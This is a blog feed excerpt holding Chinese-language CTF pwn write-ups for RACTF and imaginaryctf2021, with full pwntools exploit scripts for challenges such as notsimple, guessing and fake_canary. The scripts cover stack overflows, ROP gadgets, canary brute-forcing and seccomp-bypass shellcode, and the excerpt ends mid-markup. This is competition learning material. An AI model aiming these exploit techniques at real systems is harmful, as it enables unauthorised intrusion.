    <content type="html"><![CDATA[<p>周末小打了下ractf,get 到了一些 小姿势,于是小记下避免搞忘了。<a id="more"></a></p><h2 id="archer"><a href="#archer" class="headerlink" title="archer"></a>archer</h2><p>简单的变量覆盖…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'archer'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">49723</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p.sendline(<span class="string">'yes1'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'-fbf98'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2winrars"><a href="#ret2winrars" class="headerlink" title="ret2winrars"></a>ret2winrars</h2><p>签到，elf内自带后门。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'./ret2winrars'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">30527</span>)</span><br><span class="line"><span class="comment">#process(elf)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="number">0x20</span>*<span class="string">'1'</span>+<span class="string">'2'</span>*<span class="number">8</span>+p64(<span class="number">0x000000000401166</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="notsimple"><a href="#notsimple" class="headerlink" title="notsimple"></a>notsimple</h2><p>很有意思的一道题,flag是文件名，同时seccomp 禁用execve所以无法使用命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x09 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x0000003b  if (A &#x3D;&#x3D; execve) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000142  if (A &#x3D;&#x3D; execveat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000101  if (A &#x3D;&#x3D; openat) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000003  if (A &#x3D;&#x3D; close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000055  if (A &#x3D;&#x3D; creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000086  if (A &#x3D;&#x3D; uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000039  if (A &#x3D;&#x3D; fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000003a  if (A &#x3D;&#x3D; vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>但是经过查阅资料后发现，<code>ls</code>的底层是依赖系统调用<code>getdents</code>.</p><p>所以我们可以<code>getdents</code>系统来读取文件目录.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">e=ELF(<span class="string">'./notsimple'</span>)</span><br><span class="line"><span class="comment">#p=process('./notsimple')</span></span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">46343</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Oops, I'm leaking!"</span>)</span><br><span class="line">addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line">addr2=addr+<span class="number">0x400</span></span><br><span class="line">shell=asm(<span class="string">"""</span></span><br><span class="line"><span class="string">mov rsi,  %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x800;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rax,%s;</span></span><br><span class="line"><span class="string"> jmp rax;</span></span><br><span class="line"><span class="string">"""</span>%(hex(addr2),hex(addr2)))</span><br><span class="line">print(len(shell))</span><br><span class="line"></span><br><span class="line">p.sendline(shell+(<span class="number">0x50</span>-len(shell))*<span class="string">'1'</span>+p64(<span class="number">0</span>)+p64(addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">addr3=addr+<span class="number">0x1000</span></span><br><span class="line">shell2=asm(<span class="string">"""</span></span><br><span class="line"><span class="string">mov rsi,  %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x80;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rsi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string">  mov rdi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x0;</span></span><br><span class="line"><span class="string"> mov rsi, 0x10000;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x2;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd</span></span><br><span class="line"><span class="string">mov rsi, %s ;// buf</span></span><br><span class="line"><span class="string">mov edx, 1024 ;// count</span></span><br><span class="line"><span class="string">mov rax, 78 ;// SYS_getdents</span></span><br><span class="line"><span class="string"> syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> mov rsi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x680;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rdi, 0 ;// exit</span></span><br><span class="line"><span class="string">mov rax, 60;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">"""</span>%(hex(addr3),hex(addr3),hex(addr3),hex(addr3),hex(addr3)))</span><br><span class="line"></span><br><span class="line">p.sendline(shell2)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.sendline(<span class="string">'/pwn\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="guessing"><a href="#guessing" class="headerlink" title="guessing"></a>guessing</h2><p>有意思的一道题,在我们只有8次猜中数字的机会但是我们要猜出canary和libc基地址，一共16个数字。</p><p>我们可以通过<code>256== 2**8</code>的特性在7次猜测下大概在通过大小推理出任意一个数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guss</span><span class="params">(nums)</span>:</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    depth = <span class="number">0</span></span><br><span class="line">    addition = <span class="number">0</span></span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line">    canary2=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">        <span class="comment">#print('my_guess: '+str(my_guess))</span></span><br><span class="line">        depth += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> my_guess&lt;nums[i]:</span><br><span class="line">            <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">                my_guess += <span class="number">1</span></span><br><span class="line">                canary2 += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">                print(<span class="string">'low get!'</span>+str(my_guess))</span><br><span class="line">                <span class="comment">#print(hex(canary))</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                depth = <span class="number">0</span></span><br><span class="line">                addition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">elif</span> my_guess&gt;nums[i]:</span><br><span class="line">            <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">                my_guess -= <span class="number">1</span></span><br><span class="line">                canary2 += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment"># print(hex(canary))</span></span><br><span class="line">                print(<span class="string">'high get!'</span>+str(my_guess))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                depth = <span class="number">0</span></span><br><span class="line">                addition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            canary2 += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'samlle get!'</span>+str(my_guess))</span><br><span class="line">            <span class="comment">#print('one true')</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n=[<span class="number">111</span>,<span class="number">34</span>,<span class="number">155</span>,<span class="number">33</span>,<span class="number">23</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">90</span>]</span><br><span class="line"></span><br><span class="line">guss(n)</span><br></pre></td></tr></table></figure><p>从而在8次内尽可能得到16位数字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#target = process('./guess')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target=process(<span class="string">'./guess'</span>)<span class="comment">#remote('193.57.159.27', 55206)</span></span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">c = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">c.srand((c.time(<span class="number">0</span>)))</span><br><span class="line">x=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    k=c.rand()</span><br><span class="line">    k=k%<span class="number">255</span></span><br><span class="line">    x.append(k)</span><br><span class="line">    print(hex(k))</span><br><span class="line">print(x)</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line">depth = <span class="number">0</span></span><br><span class="line">addition = <span class="number">0</span></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(target.recvuntil(<span class="string">b'(0-7)?'</span>))</span><br><span class="line">    target.sendline(str(<span class="number">0x20</span> + i).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    print(target.recvuntil(<span class="string">b'guess:'</span>))</span><br><span class="line">    my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">    <span class="comment">#print(hex(my_guess))</span></span><br><span class="line">    target.sendline(str(my_guess).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    result = target.recvuntil(<span class="string">b'Which'</span>)</span><br><span class="line">    depth += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'low'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess += <span class="number">1</span></span><br><span class="line">            canary += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b'high'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess -= <span class="number">1</span></span><br><span class="line">            canary += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">           <span class="comment"># print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        canary += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">        <span class="comment">#print(hex(canary))</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        addition = <span class="number">0</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(<span class="string">'one true'</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(canary)</span><br><span class="line"><span class="comment">#target.interactive()</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">depth = <span class="number">0</span></span><br><span class="line">addition = <span class="number">0</span></span><br><span class="line">libc_start = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(target.recvuntil(<span class="string">b'(0-7)?'</span>))</span><br><span class="line">    target.sendline(str(<span class="number">0x30</span> + i).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    print(target.recvuntil(<span class="string">b'guess:'</span>))</span><br><span class="line">    my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">    <span class="comment">#print(hex(my_guess))</span></span><br><span class="line">    target.sendline(str(my_guess).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    result = target.recvuntil(<span class="string">b'Which'</span>)</span><br><span class="line">    depth += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'low'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess += <span class="number">1</span></span><br><span class="line">            libc_start += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b'high'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess -= <span class="number">1</span></span><br><span class="line">            libc_start += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">           <span class="comment"># print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc_start += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">        <span class="comment">#print(hex(canary))</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        addition = <span class="number">0</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(<span class="string">'one true'</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(hex(libc_start))</span><br><span class="line">libc_start_main=libc_start<span class="number">-234</span></span><br><span class="line">log.info(<span class="string">'libc_start_main:'</span>+str(libc_start_main))</span><br><span class="line">print(count)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>-count):</span><br><span class="line">    target.sendline(str(i))</span><br><span class="line">    target.recvuntil(<span class="string">'Enter your guess:'</span>)</span><br><span class="line">    target.sendline(str(x[i]))</span><br><span class="line"><span class="comment">#gdb.attach(target)</span></span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'__libc_start_main'</span>,libc_start_main)</span><br><span class="line"></span><br><span class="line">target.sendline(<span class="string">'x'</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(x.ogg(<span class="number">1</span>)))</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末小打了下ractf,get 到了一些 小姿势,于是小记下避免搞忘了。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>imaginaryctf2021-pwn-wp</title>
    <link href="lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/"/>
    <id>lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/</id>
    <published>2021-07-28T15:40:37.640Z</published>
    <updated>2021-07-28T16:28:20.330Z</updated>
    
    <content type="html"><![CDATA[<p>又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）</p><a id="more"></a><h2 id="fake-canary"><a href="#fake-canary" class="headerlink" title="fake_canary"></a>fake_canary</h2><p>题目没有看canary，但自己写了类似canary的功能。通过栈溢出在类似canary填上伪造canary即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'./fake_canary'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42002</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400608 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400536 : ret</span></span><br><span class="line"><span class="string">0x0000000000400542 : ret 0x200a</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>*<span class="number">5</span>+p64(<span class="number">0xDEADBEEF</span>)+p64(e.symbols[<span class="string">'win'</span>])+p64(<span class="number">0x00000000000400729</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="linonophobia"><a href="#linonophobia" class="headerlink" title="linonophobia"></a>linonophobia</h2><p>题目很有意思把printf函数地址偷偷换成puts地址。导致本菜鸡在那卡了半天。</p><p>但发现可以通过puts和栈溢出泄露出canary。</p><p>但发现str_bin_sh和onegatgad都打不通。分析elf发现<code>0x000000000601060</code>地址端有写入提示，在此写入后门。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 